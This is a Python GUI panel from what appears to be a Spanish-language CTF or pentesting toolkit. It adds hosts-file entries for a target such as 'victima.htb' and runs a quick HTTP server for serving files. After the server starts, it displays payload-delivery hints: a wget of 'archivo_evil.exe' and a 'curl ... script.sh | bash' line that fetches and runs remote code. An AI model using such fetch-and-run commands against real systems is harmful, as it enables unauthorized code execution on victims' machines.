import os
import re
import threading
import http.server
import socketserver
import functools

import customtkinter as ctk

from ..ui_constants import UI_FONT, UI_FONT_BOLD, MONO_FONT, Toast
from ..services import append_hosts_entry, resolve_hosts_path


class UtilsPanel(ctk.CTkFrame):
    def __init__(self, app):
        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
        self.app = app
        self.httpd = None
        self.http_thread = None
        self.selected_folder = os.getcwd()
        self.build()

    def build(self):
        c = self.app.c
        header = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
        header.pack(fill="x", pady=8)
        ctk.CTkLabel(header, text="Utilidades", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)

        hosts_card = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        hosts_card.pack(fill="x", pady=8)
        ctk.CTkLabel(hosts_card, text="Añadir dominio a hosts", font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).grid(row=0, column=0, padx=12, pady=10, sticky="w")
        self.domain_entry = ctk.CTkEntry(hosts_card, placeholder_text="victima.htb",
                                         fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                         corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.domain_entry.grid(row=1, column=0, padx=12, pady=(0, 10), sticky="w")
        self.btn_hosts = ctk.CTkButton(hosts_card, text="Añadir", fg_color=c["ACCENT_SECONDARY"], hover_color=c["ACCENT_HOVER"],
                                       corner_radius=12, font=UI_FONT_BOLD, command=self.add_to_hosts)
        self.btn_hosts.grid(row=1, column=1, padx=10, pady=(0, 10))

        server_card = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        server_card.pack(fill="x", pady=8)
        ctk.CTkLabel(server_card, text="Servidor HTTP rápido", font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).grid(row=0, column=0, padx=12, pady=10, sticky="w")

        self.http_port_entry = ctk.CTkEntry(server_card, width=140, placeholder_text="8000",
                                            fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                            corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.http_port_entry.insert(0, "8000")
        self.http_port_entry.grid(row=1, column=0, padx=12, pady=8, sticky="w")

        self.btn_folder = ctk.CTkButton(server_card, text="📂 Carpeta", width=110,
                                        fg_color=c["BG_CARD"], hover_color=c["ACCENT_HOVER"],
                                        corner_radius=10, font=UI_FONT_BOLD, command=self.choose_directory)
        self.btn_folder.grid(row=1, column=1, padx=8, pady=8)

        self.btn_http_start = ctk.CTkButton(server_card, text="Start Server", fg_color=c["ACCENT"], hover_color=c["ACCENT_HOVER"],
                                            corner_radius=12, font=UI_FONT_BOLD, command=self.start_http_server)
        self.btn_http_start.grid(row=1, column=2, padx=8, pady=8)

        self.btn_http_stop = ctk.CTkButton(server_card, text="Stop", fg_color=c["TEXT_DANGER"], hover_color="#dc2626",
                                           corner_radius=12, font=UI_FONT_BOLD, command=self.stop_http_server,
                                           state="disabled", text_color="#0b0b0b")
        self.btn_http_stop.grid(row=1, column=3, padx=8, pady=8)

        self.http_status = ctk.CTkLabel(server_card, text="Server detenido.", text_color=c["TEXT_MUTED"], font=UI_FONT)
        self.http_status.grid(row=2, column=0, columnspan=4, padx=12, pady=6, sticky="w")

        self.download_hint = ctk.CTkTextbox(server_card, width=640, height=70,
                                            fg_color=c["BG_CARD"], text_color=c["TEXT_PRIMARY"], font=MONO_FONT)
        self.download_hint.insert("end", "Cuando arranques el servidor verás aquí el comando wget/curl.\n")
        self.download_hint.configure(state="disabled")
        self.download_hint.grid(row=3, column=0, columnspan=4, padx=12, pady=8, sticky="we")

        ctk.CTkLabel(server_card, text="Logs del servidor", font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).grid(row=4, column=0, padx=12, pady=(6, 2), sticky="w")
        self.http_log_box = ctk.CTkTextbox(server_card, width=640, height=110, font=MONO_FONT,
                                           fg_color=c["BG_CARD"], text_color=c["TEXT_SUCCESS"])
        self.http_log_box.grid(row=5, column=0, columnspan=4, padx=12, pady=(2, 12), sticky="we")


    def add_to_hosts(self):
        ip = self.app.panels["scanner"].entry_ip.get()
        domain = self.domain_entry.get()
        if not ip or not domain:
            return
        if not self._valid_ip(ip) or not self._valid_domain(domain):
            Toast(self.app, "IP o dominio inválido", self.app.c)
            if self.app.logger:
                self.app.logger.warn("IP o dominio inválido para hosts", tag="UTILS")
            return
        try:
            ruta = append_hosts_entry(ip, domain)
            self.http_status.configure(text=f"Añadido {domain} -> {ip}", text_color=self.app.c["TEXT_SUCCESS"])
            if self.app.logger:
                self.app.logger.utils(f"Hosts actualizado: {domain} -> {ip}")
        except PermissionError:
            ruta = resolve_hosts_path()
            self.http_status.configure(text=f"Permisos insuficientes para {ruta}", text_color=self.app.c["TEXT_DANGER"])
            if self.app.logger:
                self.app.logger.error(f"Permisos insuficientes para {ruta}", tag="UTILS")
        except Exception as e:
            self.http_status.configure(text=f"Error: {e}", text_color=self.app.c["TEXT_DANGER"])
            if self.app.logger:
                self.app.logger.error(f"Error hosts: {e}", tag="UTILS")

    def _valid_ip(self, ip):
        return bool(re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", ip))

    def _valid_domain(self, domain):
        return bool(re.fullmatch(r"[A-Za-z0-9.-]+", domain))


    def choose_directory(self):
        from tkinter import filedialog
        folder = filedialog.askdirectory()
        if folder:
            self.selected_folder = folder
            self.app.context.http_server_path = folder
            self.http_status.configure(text=f"Sirviendo: {os.path.basename(folder)}", text_color=self.app.c["TEXT_PRIMARY"])
            if self.app.logger:
                self.app.logger.server(f"Directorio seleccionado: {folder}")

    def start_http_server(self):
        if self.httpd is not None:
            return
        port_text = self.http_port_entry.get() or "8000"
        try:
            port = int(port_text)
        except ValueError:
            self.http_status.configure(text="Puerto inválido.", text_color=self.app.c["TEXT_WARNING"])
            if self.app.logger:
                self.app.logger.warn("Puerto inválido para HTTP server", tag="SERVER")
            return
        self.app.context.http_server_path = self.selected_folder

        class GUIRequestHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(handler_self, format, *args):
                mensaje = "%s - - [%s] %s\n" % (
                    handler_self.client_address[0],
                    handler_self.log_date_time_string(),
                    format % args
                )
                self.after(0, lambda: self.write_http_log(mensaje))

        handler = functools.partial(GUIRequestHandler, directory=self.selected_folder)
        try:
            self.httpd = socketserver.TCPServer(("", port), handler)
        except OSError as e:
            self.http_status.configure(text=f"Error puerto: {e.strerror}", text_color=self.app.c["TEXT_DANGER"])
            self.httpd = None
            if self.app.logger:
                self.app.logger.error(f"Error puerto: {e.strerror}", tag="SERVER")
            return

        def serve():
            try:
                self.httpd.serve_forever()
            except Exception:
                pass

        self.http_thread = threading.Thread(target=serve, daemon=True)
        self.http_thread.start()
        self.btn_http_start.configure(state="disabled")
        self.btn_http_stop.configure(state="normal")
        self.btn_folder.configure(state="disabled")
        self.http_status.configure(text=f"ON | Port {port} | Dir: .../{os.path.basename(self.selected_folder)}", text_color=self.app.c["TEXT_SUCCESS"])

        if self.app.logger:
            self.app.logger.server(f"Servidor HTTP iniciado en {port} | Dir: {self.selected_folder}")

        local_ip = self.app.obtener_ip_local()
        self.download_hint.configure(state="normal")
        self.download_hint.delete("1.0", "end")
        self.download_hint.insert("end", f"wget http://{local_ip}:{port}/archivo_evil.exe\ncurl http://{local_ip}:{port}/script.sh | bash")
        self.download_hint.configure(state="disabled")

    def write_http_log(self, msg):
        self.http_log_box.insert("end", msg)
        self.http_log_box.see("end")

    def stop_http_server(self):
        if self.httpd is None:
            return
        self.httpd.shutdown()
        self.httpd.server_close()
        self.httpd = None
        self.http_thread = None
        self.btn_http_start.configure(state="normal")
        self.btn_http_stop.configure(state="disabled")
        self.btn_folder.configure(state="normal")
        self.http_status.configure(text="Server detenido.", text_color=self.app.c["TEXT_MUTED"])
        if self.app.logger:
            self.app.logger.server("Servidor HTTP detenido")
